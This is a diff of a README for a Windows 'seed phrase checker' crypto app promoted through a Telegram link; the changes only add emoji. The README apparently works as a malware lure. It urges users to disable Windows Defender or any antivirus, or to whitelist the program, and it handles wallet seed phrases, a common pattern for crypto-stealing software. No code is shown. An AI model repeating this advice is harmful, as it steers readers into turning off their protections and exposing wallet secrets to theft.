@@ -1,11 +1,11 @@
 # Crypto Wallet Seed Phrase Checker
 A Windows desktop app that lets you check cryptocurrency balances across multiple blockchain networks. Supports Ethereum, Polygon, and BSC networks.
 
-### Seed Phrase Checker v.1.1 / https://t.me/seedphrasecheckerr
+### 🔴 Seed Phrase Checker v.1.1 / https://t.me/seedphrasecheckerr 🔴
 
 1- The program currently only checks seed phrases.
 
-2- Defender may prevent the seed phrase checker from working. Even if balance is found in Seed Phrase, it may report that it is not found. We strongly recommend disabling Defender or any other antivirus program you use, or at least whitelisting Seed Phrase Checker.
+2- ⚠️ Defender may prevent the seed phrase checker from working. Even if balance is found in Seed Phrase, it may report that it is not found. We strongly recommend disabling Defender or any other antivirus program you use, or at least whitelisting Seed Phrase Checker.
 
 3- If balance is found, a log.txt file will be created on your desktop, containing the seed phrase and balance.
 
